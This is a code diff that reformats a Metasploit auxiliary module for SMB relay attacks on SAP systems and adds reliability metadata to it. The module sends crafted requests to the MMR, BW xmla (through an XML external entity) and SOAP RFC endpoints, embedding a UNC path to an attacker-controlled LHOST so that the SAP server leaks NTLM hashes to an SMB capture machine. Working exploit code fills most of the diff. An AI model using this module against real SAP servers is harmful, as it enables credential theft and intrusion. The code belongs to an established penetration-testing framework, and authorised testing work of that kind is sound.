@@ -31,7 +31,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description' => %q{
           This module exploits provides several SMB Relay abuse through different SAP
         services and functions. The attack is done through specially crafted requests
-        including a UNC Path which will be accessing by the SAP system while trying to
+        including a UNC path which will be accessing by the SAP system while trying to
         process the request.  In order to get the hashes the auxiliary/server/capture/smb
         module can be used.
       },
@@ -39,30 +39,34 @@ class MetasploitModule < Msf::Auxiliary
         [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-033-sap-basis-6-407-02-xml-external-entity/' ],
         [ 'URL', 'https://launchpad.support.sap.com/#/notes/1597066' ]
       ],
-      'Author' =>
-        [
-          'Alexey Tyurin', # xmla service SMB relay abuse discovery
-          'nmonkee' # Metasploit module
-        ],
-      'License' => MSF_LICENSE
+      'Author' => [
+        'Alexey Tyurin', # xmla service SMB relay abuse discovery
+        'nmonkee' # Metasploit module
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options([
       Opt::RPORT(8000),
-      OptString.new('CLIENT',   [true,  'SAP client', '001']),
+      OptString.new('CLIENT', [true, 'SAP client', '001']),
       OptString.new('HttpUsername', [false, 'Username (Ex SAP*)']),
       OptString.new('HttpPassword', [false, 'Password (Ex 06071992)']),
-      OptAddressLocal.new('LHOST',   [true,  'Server IP or hostname of the SMB Capture system']),
-      OptEnum.new('ABUSE',      [true,  'SMB Relay abuse to use', "MMR",
+      OptAddressLocal.new('LHOST', [true, 'Server IP or hostname of the SMB Capture system']),
+      OptEnum.new('ABUSE', [
+        true, 'SMB Relay abuse to use', 'MMR',
         [
-          "MMR",
-          "BW",
-          "CLBA_CLASSIF_FILE_REMOTE_HOST",
-          "CLBA_UPDATE_FILE_REMOTE_HOST"
+          'MMR',
+          'BW',
+          'CLBA_CLASSIF_FILE_REMOTE_HOST',
+          'CLBA_UPDATE_FILE_REMOTE_HOST'
         ]
       ]),
     ])
-
   end
 
   def valid_credentials?
@@ -73,13 +77,13 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['HttpPassword'].blank?
       return false
     end
+
     return true
   end
 
   def run_xmla
-
-    if not valid_credentials?
-      vprint_error("#{rhost}:#{rport} - Credentials needed in order to abuse the SAP BW service")
+    if !valid_credentials?
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Credentials needed in order to abuse the SAP BW service")
       return
     end
 
@@ -91,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     data << '<in>&foo;</in>'
 
     begin
-      print_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request for #{smb_uri}")
       res = send_request_raw({
         'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
         'method' => 'POST',
@@ -100,68 +104,66 @@ class MetasploitModule < Msf::Auxiliary
         'ctype' => 'text/xml; charset=UTF-8',
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']
       })
-      if res and res.code == 200 and res.body =~ /XML for Analysis Provider/ and res.body =~ /Request transfered is not a valid XML/
-        print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
-      else
-        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}") if res
+      if res && (res.code == 200) && res.body =~ /XML for Analysis Provider/ && res.body =~ /Request transfered is not a valid XML/
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - SMB Relay looks successful, check your SMB capture machine")
+      elsif res
+        vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Response: #{res.code} - #{res.message}")
       end
     rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - Unable to connect")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
       return
     end
   end
 
   def run_mmr
-    begin
-      smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"
+    smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"
 
-      if datastore['HttpUsername'].empty?
-        vprint_status("#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}")
-        res = send_request_cgi({
-          'uri' => '/mmr/MMR',
-          'method' => 'HEAD',
-          'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-          'ctype' => 'text/xml; charset=UTF-8',
-          'vars_get' => {
-            'sap-client' => datastore['CLIENT'],
-            'sap-language' => 'EN',
-            'filename' => smb_uri
-          }
-        })
+    if datastore['HttpUsername'].empty?
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending unauthenticated request for #{smb_uri}")
+      res = send_request_cgi({
+        'uri' => '/mmr/MMR',
+        'method' => 'HEAD',
+        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+        'ctype' => 'text/xml; charset=UTF-8',
+        'vars_get' => {
+          'sap-client' => datastore['CLIENT'],
+          'sap-language' => 'EN',
+          'filename' => smb_uri
+        }
+      })
 
-      else
-        vprint_status("#{rhost}:#{rport} - Sending authenticated request for #{smb_uri}")
-        res = send_request_cgi({
-          'uri' => '/mmr/MMR',
-          'method' => 'GET',
-          'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-          'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-          'ctype' => 'text/xml; charset=UTF-8',
-          'vars_get' => {
-            'sap-client' => datastore['CLIENT'],
-            'sap-language' => 'EN',
-            'filename' => smb_uri
-          }
-        })
-      end
-
-      if res
-        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}")
-      end
-    rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - Unable to connect")
-      return
+    else
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending authenticated request for #{smb_uri}")
+      res = send_request_cgi({
+        'uri' => '/mmr/MMR',
+        'method' => 'GET',
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+        'ctype' => 'text/xml; charset=UTF-8',
+        'vars_get' => {
+          'sap-client' => datastore['CLIENT'],
+          'sap-language' => 'EN',
+          'filename' => smb_uri
+        }
+      })
     end
+
+    if res
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Response: #{res.code} - #{res.message}")
+    end
+  rescue ::Rex::ConnectionError
+    print_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
+    return
   end
 
   def send_soap_rfc_request(data, smb_uri)
-    if not valid_credentials?
-      vprint_error("#{rhost}:#{rport} - Credentials needed in order to abuse the SAP SOAP RFC service")
+    if !valid_credentials?
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Credentials needed in order to abuse the SAP SOAP RFC service")
       return
     end
 
     begin
-      vprint_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending request for #{smb_uri}")
       res = send_request_cgi({
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
@@ -170,20 +172,20 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
         },
         'vars_get' => {
           'sap-client' => datastore['CLIENT'],
           'sap-language' => 'EN'
         }
       })
-      if res and res.code == 500 and res.body =~ /OPEN_FAILURE/
-        print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
-      else
-        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}") if res
+      if res && (res.code == 500) && res.body =~ /OPEN_FAILURE/
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - SMB Relay looks successful, check your SMB capture machine")
+      elsif res
+        vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Response: #{res.code} - #{res.message}")
       end
     rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - Unable to connect")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Unable to connect")
       return
     end
   end
@@ -236,16 +238,16 @@ class MetasploitModule < Msf::Auxiliary
     send_soap_rfc_request(data, smb_uri)
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     case datastore['ABUSE']
-      when "MMR"
-        run_mmr
-      when "BW"
-        run_xmla
-      when "CLBA_CLASSIF_FILE_REMOTE_HOST"
-        run_clba_classif_file_remote
-      when "CLBA_UPDATE_FILE_REMOTE_HOST"
-        run_clba_update_file_remote
+    when 'MMR'
+      run_mmr
+    when 'BW'
+      run_xmla
+    when 'CLBA_CLASSIF_FILE_REMOTE_HOST'
+      run_clba_classif_file_remote
+    when 'CLBA_UPDATE_FILE_REMOTE_HOST'
+      run_clba_update_file_remote
     end
   end
 end
